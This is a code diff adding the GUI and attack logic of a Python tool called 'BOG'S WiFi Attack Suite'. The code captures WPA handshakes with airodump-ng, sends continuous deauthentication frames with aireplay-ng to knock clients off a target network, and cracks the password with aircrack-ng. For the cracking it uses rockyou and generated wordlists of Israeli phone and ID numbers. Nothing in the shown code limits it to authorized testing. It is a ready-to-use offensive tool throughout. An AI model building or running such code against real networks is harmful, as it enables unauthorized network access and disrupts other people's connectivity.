+            ICONS['stop'],
+            "Stop the handshake capture process"
+        )
+        self.stop_button.pack(pady=5)
+        self.stop_button.pack_forget()  # Hide initially
+
+        # Wordlist buttons frame
+        wordlist_frame = create_styled_frame(frame)
+        wordlist_frame.pack(fill="x", pady=10)
+
+        # Built-in wordlist button
+        self.builtin_wordlist_btn = create_styled_button(
+            wordlist_frame,
+            "Built-in Wordlist",
+            self.use_built_in_wordlist,
+            COLORS['primary'],
+            ICONS['wordlist'],
+            "Use the built-in rockyou.txt wordlist"
+        )
+        self.builtin_wordlist_btn.pack(side="left", padx=5)
+        self.builtin_wordlist_btn.config(state="disabled")
+
+        # Israeli phone numbers button
+        self.phone_wordlist_btn = create_styled_button(
+            wordlist_frame,
+            "Israeli Phone Numbers",
+            self.use_israeli_phone_wordlist,
+            COLORS['primary'],
+            ICONS['wordlist'],
+            "Generate and use Israeli phone numbers wordlist"
+        )
+        self.phone_wordlist_btn.pack(side="left", padx=5)
+        self.phone_wordlist_btn.config(state="disabled")
+
+        # Israeli ID numbers button
+        self.id_wordlist_btn = create_styled_button(
+            wordlist_frame,
+            "Israeli ID Numbers",
+            self.use_israeli_id_wordlist,
+            COLORS['primary'],
+            ICONS['wordlist'],
+            "Generate and use Israeli ID numbers wordlist"
+        )
+        self.id_wordlist_btn.pack(side="left", padx=5)
+        self.id_wordlist_btn.config(state="disabled")
+
+        # Custom wordlist button
+        self.custom_wordlist_btn = create_styled_button(
+            wordlist_frame,
+            "Custom Wordlist",
+            self.select_custom_wordlist,
+            COLORS['primary'],
+            ICONS['wordlist'],
+            "Select your own custom wordlist file"
+        )
+        self.custom_wordlist_btn.pack(side="left", padx=5)
+        self.custom_wordlist_btn.config(state="disabled")
+
+        # Create log text widget
+        log_frame = create_styled_frame(frame)
+        log_frame.pack(fill="both", expand=True, pady=5)
+        
+        self.log_text = tk.Text(
+            log_frame,
+            height=10,
+            bg="black",
+            fg=COLORS['success'],
+            font=('Courier', 9)
+        )
+        self.log_text.pack(side="left", fill="both", expand=True)
+
+        scrollbar = ttk.Scrollbar(log_frame, command=self.log_text.yview)
+        scrollbar.pack(side="right", fill="y")
+        self.log_text.config(yscrollcommand=scrollbar.set)
+
+        # Start button
+        self.start_brute_button = create_styled_button(
+            frame,
+            "Start Brute Force",
+            self.start_brute_force,
+            COLORS['success'],
+            ICONS['start'],
+            TOOLTIPS['brute_force']
+        )
+        self.start_brute_button.pack(pady=10)
+        self.start_brute_button.config(state="disabled")
+
+        return frame
+
+    def capture_handshake(self):
+        """Start handshake capture process."""
+        interface = self.brute_interface_var.get()
+        bssid = self.brute_bssid_var.get()
+        essid = self.brute_essid_var.get()
+
+        if not all([interface, bssid, essid]):
+            messagebox.showwarning("Error", "Please fill in all fields")
+            return
+
+        if not is_monitor_mode(interface):
+            messagebox.showwarning("Error", "Interface must be in monitor mode")
+            return
+
+        # Clean up any existing processes
+        self.cleanup_processes()
+        self.handshake_captured = False
+
+        try:
+            # Update UI
+            self.capture_button.pack_forget()
+            self.stop_button.pack()
+            self.capture_status_label.config(text="Starting capture...", fg=COLORS['warning'])
+            self.progress_var.set("●")
+            self.log_text.delete(1.0, tk.END)
+            
+            # Create capture file
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            self.current_capture_file = f"/tmp/bog_capture_{timestamp}"
+
+            # Start airodump-ng
+            airodump_cmd = [
+                "sudo", "airodump-ng",
+                "--bssid", bssid,
+                "--write", self.current_capture_file,
+                "--output-format", "pcap",
+                "--write-interval", "1",
+                interface
+            ]
+
+            self.log_text.insert("end", f"Starting airodump-ng...\n")
+            
+            # Use shell=False and create new process group
+            self.current_capture_process = subprocess.Popen(
+                airodump_cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                preexec_fn=os.setsid,
+                shell=False,
+                universal_newlines=True,
+                bufsize=1
+            )
+
+            if self.current_capture_process.poll() is not None:
+                raise Exception("Failed to start airodump-ng")
+
+            self.capture_status_label.config(text="Capturing packets...")
+            
+            # Start deauth process
+            self.start_deauth_process()
+
+            # Start monitoring processes
+            self.root.after(100, self.update_capture_status)
+
+        except Exception as e:
+            self.log_text.insert("end", f"Error starting capture: {str(e)}\n")
+            self.stop_capture(force=True)
+
+    def start_deauth_process(self):
+        """Start a separate deauth process."""
+        try:
+            deauth_cmd = [
+                "sudo", "aireplay-ng",
+                "--deauth", "0",  # Continuous deauth
+                "-a", self.brute_bssid_var.get(),
+                self.brute_interface_var.get()
+            ]
+            
+            # Start deauth process
+            self.deauth_process = subprocess.Popen(
+                deauth_cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                preexec_fn=os.setsid,
+                shell=False
+            )
+            
+            self.log_text.insert("end", "Started deauth process...\n")
+            self.log_text.see("end")
+            
+        except Exception as e:
+            self.log_text.insert("end", f"Error starting deauth: {str(e)}\n")
+
+    def update_capture_status(self):
+        """Update capture status and UI."""
+        if not self.current_capture_process:
+            return
+
+        try:
+            # Update progress indicator
+            current = self.progress_var.get()
+            self.progress_var.set("○" if current == "●" else "●")
+
+            # Check if process is still running
+            if self.current_capture_process.poll() is not None:
+                self.log_text.insert("end", "Capture process terminated unexpectedly\n")
+                self.stop_capture(force=True)
+                return
+
+            # Check for handshake
+            if self.current_capture_file:
+                cap_file = f"{self.current_capture_file}-01.cap"
+                if os.path.exists(cap_file):
+                    try:
+                        result = subprocess.run(
+                            ["aircrack-ng", cap_file],
+                            capture_output=True,
+                            text=True,
+                            timeout=5
+                        )
+                        
+                        if "1 handshake" in result.stdout:
+                            self.log_text.insert("end", "Handshake found!\n")
+                            self.handshake_captured = True
+                            self.capture_status_label.config(
+                                text="✅ Handshake Captured!",
+                                fg=COLORS['success']
+                            )
+                            self.progress_var.set("✓")
+                            self.enable_wordlist_buttons()
+                            self.stop_capture()
+                            messagebox.showinfo(
+                                "Success",
+                                "Handshake captured successfully!\nYou can now start the cracking process."
+                            )
+                            return
+                    except Exception as e:
+                        self.log_text.insert("end", f"Error checking capture file: {str(e)}\n")
+
+            # Read and display output
+            try:
+                if self.current_capture_process.stderr:
+                    output = self.current_capture_process.stderr.readline()
+                    if output:
+                        self.log_text.insert("end", output)
+                        self.log_text.see("end")
+            except:
+                pass
+
+            # Continue updating if not captured
+            if not self.handshake_captured:
+                self.root.after(100, self.update_capture_status)
+
+        except Exception as e:
+            self.log_text.insert("end", f"Error in status update: {str(e)}\n")
+            self.stop_capture(force=True)
+
+    def stop_capture(self, force=False):
+        """Stop the handshake capture process."""
+        try:
+            # Stop airodump-ng process
+            if self.current_capture_process:
+                try:
+                    os.killpg(os.getpgid(self.current_capture_process.pid), signal.SIGTERM)
+                except:
+                    try:
+                        self.current_capture_process.terminate()
+                    except:
+                        pass
+                self.current_capture_process = None
+                self.log_text.insert("end", "Stopped airodump-ng process\n")
+
+            # Stop deauth process
+            if hasattr(self, 'deauth_process') and self.deauth_process:
+                try:
+                    os.killpg(os.getpgid(self.deauth_process.pid), signal.SIGTERM)
+                except:
+                    try:
+                        self.deauth_process.terminate()
+                    except:
+                        pass
+                self.deauth_process = None
+                self.log_text.insert("end", "Stopped deauth process\n")
+
+            # Kill all related processes to be sure
+            try:
+                subprocess.run(["sudo", "pkill", "-f", "airodump-ng"], stderr=subprocess.DEVNULL)
+                subprocess.run(["sudo", "pkill", "-f", "aireplay-ng"], stderr=subprocess.DEVNULL)
+                self.log_text.insert("end", "Cleaned up all processes\n")
+            except:
+                pass
+
+        except Exception as e:
+            self.log_text.insert("end", f"Error during cleanup: {str(e)}\n")
+        
+        finally:
+            # Always restore UI state
+            self.stop_button.pack_forget()
+            self.capture_button.pack()
+            if not self.handshake_captured or force:
+                self.capture_status_label.config(text="Capture stopped", fg=COLORS['danger'])
+                self.progress_var.set("")
+                self.log_text.insert("end", "Capture process terminated\n")
+                self.log_text.see("end")
+
+    def cleanup_processes(self):
+        """Clean up all running processes."""
+        try:
+            # Stop capture process
+            if hasattr(self, 'current_capture_process') and self.current_capture_process:
+                try:
+                    os.killpg(os.getpgid(self.current_capture_process.pid), signal.SIGTERM)
+                except:
+                    pass
+                self.current_capture_process = None
+
+            # Stop deauth process
+            if hasattr(self, 'deauth_process') and self.deauth_process:
+                try:
+                    os.killpg(os.getpgid(self.deauth_process.pid), signal.SIGTERM)
+                except:
+                    pass
+                self.deauth_process = None
+
+            # Kill all related processes
+            subprocess.run(["sudo", "pkill", "-f", "airodump-ng"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "pkill", "-f", "aireplay-ng"], stderr=subprocess.DEVNULL)
+        except:
+            pass
+
+    def enable_wordlist_buttons(self):
+        """Enable all wordlist buttons after successful handshake capture."""
+        for btn in [self.builtin_wordlist_btn, self.phone_wordlist_btn, 
+                    self.id_wordlist_btn, self.custom_wordlist_btn]:
+            btn.config(state="normal")
+
+    def get_channel(self, bssid):
+        """Get the channel of the target network."""
+        logger.info(f"Getting channel for BSSID: {bssid}")
+        try:
+            # Run a quick scan without creating a file
+            cmd = [
+                "sudo", "iwlist", 
+                self.brute_interface_var.get(), 
+                "scan"
+            ]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            
+            # Parse the output to find the channel
+            lines = result.stdout.split('\n')
+            current_cell = None
+            current_channel = None
+            
+            for line in lines:
+                if 'Address:' in line and bssid.lower() in line.lower():
+                    current_cell = True
+                elif current_cell and 'Channel:' in line:
+                    current_channel = line.split(':')[1].strip()
+                    logger.info(f"Found channel {current_channel} for BSSID {bssid}")
+                    return current_channel
+                elif current_cell and 'Cell' in line:
+                    current_cell = None
+                
+        except Exception as e:
+            logger.error(f"Error getting channel: {e}")
+        
+        logger.warning(f"Could not determine channel for {bssid}, using default channel 1")
+        return "1"
+
+    def use_built_in_wordlist(self):
+        """Use built-in wordlist for brute force."""
+        if not os.path.exists(BUILT_IN_WORDLIST):
+            messagebox.showwarning("Error", "Built-in wordlist not found")
+            return
+
+        self.start_brute_force(BUILT_IN_WORDLIST)
+
+    def select_custom_wordlist(self):
+        """Select custom wordlist for brute force."""
+        file_path = filedialog.askopenfilename(
+            title="Select Wordlist",
+            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
+        )
+        if file_path:
+            self.start_brute_force(file_path)
+
+    def start_brute_force(self, wordlist_path):
+        """Start WPA brute force attack with improved feedback."""
+        if not self.handshake_captured or not self.current_capture_file:
+            messagebox.showwarning("Error", "Please capture a handshake first")
+            return
+
+        try:
+            # Create progress window
+            progress_window = tk.Toplevel(self.root)
+            progress_window.title("Brute Force Progress")
+            progress_window.geometry("600x400")
+            
+            # Add text widget for output
+            output_text = tk.Text(progress_window, bg="black", fg="#00FF00")
+            output_text.pack(fill="both", expand=True)
+            
+            # Start aircrack-ng
+            cmd = f"sudo aircrack-ng -w {wordlist_path} {self.current_capture_file}-01.cap"
+            process = subprocess.Popen(
+                cmd.split(),
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                universal_newlines=True
+            )
+            
+            def update_output():
+                output = process.stdout.readline()
+                if output:
+                    output_text.insert("end", output)
+                    output_text.see("end")
+                    # Check for key found
+                    if "KEY FOUND!" in output:
+                        key = re.search(r"KEY FOUND! \[ (.*?) \]", output)
+                        if key:
+                            messagebox.showinfo("Success", f"Password found: {key.group(1)}")
+                    progress_window.after(100, update_output)
+            
+            update_output()
+
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to start brute force attack: {e}")
+            logger.error(f"Brute force error: {e}")
+
+    def use_israeli_phone_wordlist(self):
+        """Use Israeli phone numbers wordlist with progress feedback."""
+        progress_window = tk.Toplevel(self.root)
+        progress_window.title("Generating Phone Numbers")
+        progress_window.geometry("300x100")
+        
+        label = tk.Label(progress_window, text="Generating phone numbers wordlist...")
+        label.pack(pady=10)
+        
+        progress = ttk.Progressbar(progress_window, mode='determinate')
+        progress.pack(fill="x", padx=20, pady=10)
+        
+        def generate():
+            try:
+                with open(ISRAELI_PHONE_WORDLIST, 'w') as f:
+                    total = 10  # Total prefixes (050-059)
+                    for i, prefix in enumerate(range(50, 60)):
+                        progress['value'] = (i / total) * 100
+                        progress_window.update()
+                        for number in range(1000000, 10000000):  # 7 digits
+                            f.write(f"0{prefix}{number}\n")
+                progress_window.destroy()
+                self.start_brute_force(ISRAELI_PHONE_WORDLIST)
+            except Exception as e:
+                messagebox.showerror("Error", f"Failed to generate phone numbers: {e}")
+                progress_window.destroy()
+        
+        progress_window.after(100, generate)
+
+    def use_israeli_id_wordlist(self):
+        """Use Israeli ID numbers wordlist for brute force."""
+        if not os.path.exists(ISRAELI_ID_WORDLIST):
+            generate_israeli_id_wordlist()
+        self.start_brute_force(ISRAELI_ID_WORDLIST)
+
+    def setup_log_panel(self):
+        """Setup the log panel."""
+        log_frame = create_styled_frame(self.root)
+        log_frame.pack(fill="x", padx=10, pady=5)
+
+        self.log_text = tk.Text(log_frame, height=8, width=70, bg="black", fg="#2ECC71")
+        self.log_text.pack(side="left", fill="both", expand=True)
+
+        scrollbar = ttk.Scrollbar(log_frame, command=self.log_text.yview)
+        scrollbar.pack(side="right", fill="y")
+        self.log_text.config(yscrollcommand=scrollbar.set)
+
+    def setup_footer(self):
+        """Setup the footer with stop button and credits."""
+        footer_frame = create_styled_frame(self.root)
+        footer_frame.pack(fill="x", padx=10, pady=5)
+
+        # Stop button with icon and tooltip
+        create_styled_button(
+            footer_frame,
+            "STOP ALL ATTACKS",
+            self.process_manager.stop_all,
+            COLORS['danger'],
+            ICONS['stop'],
+            TOOLTIPS['stop']
+        ).pack(side="left", padx=5)
+
+        # Create a frame for credits
+        credits_frame = create_styled_frame(footer_frame)
+        credits_frame.pack(side="right", padx=5)
+
+        # Version label
+        version_label = create_styled_label(
+            credits_frame,
+            "BOG'S WiFi Attack Suite | v9 | 2025"
+        )
+        version_label.pack(side="left", padx=5)
+
+        # Social links
+        social_frame = create_styled_frame(credits_frame)
+        social_frame.pack(side="left", padx=5)
+
+        # LinkedIn link with tooltip
+        linkedin_label = tk.Label(
+            social_frame,
+            text="LinkedIn",
+            bg=COLORS['bg_light'],
+            fg=COLORS['text'],
+            font=("Arial", 10, "underline"),
+            cursor="hand2"
+        )
+        linkedin_label.pack(side="left", padx=5)
+        linkedin_label.bind("<Button-1>", lambda e: self.open_linkedin())
+        create_tooltip(linkedin_label, "Visit my LinkedIn profile")
+
+        # GitHub link with tooltip
+        github_label = tk.Label(
+            social_frame,
+            text="GitHub",
+            bg=COLORS['bg_light'],
+            fg=COLORS['text'],
+            font=("Arial", 10, "underline"),
+            cursor="hand2"
+        )
+        github_label.pack(side="left", padx=5)
+        github_label.bind("<Button-1>", lambda e: self.open_github())
+        create_tooltip(github_label, "Visit my GitHub profile")
+
+    def open_linkedin(self):
+        """Open LinkedIn profile in default browser."""
+        import webbrowser
+        webbrowser.open("https://www.linkedin.com/in/ben-bagaimahr/")
+
+    def open_github(self):
+        """Open GitHub profile in default browser."""
+        import webbrowser
+        webbrowser.open("https://github.com/Ben-Big/")
+
+# ------------------ Main Entry Point ------------------
+if __name__ == "__main__":
+    try:
+        check_root()
+        check_system()
+        root = tk.Tk()
+        app = BogWifiSuite(root)
+        root.mainloop()
+    except Exception as e:
+        logger.error(f"Application error: {e}")
+        messagebox.showerror("Error", f"An error occurred: {e}")
+        sys.exit(1) 
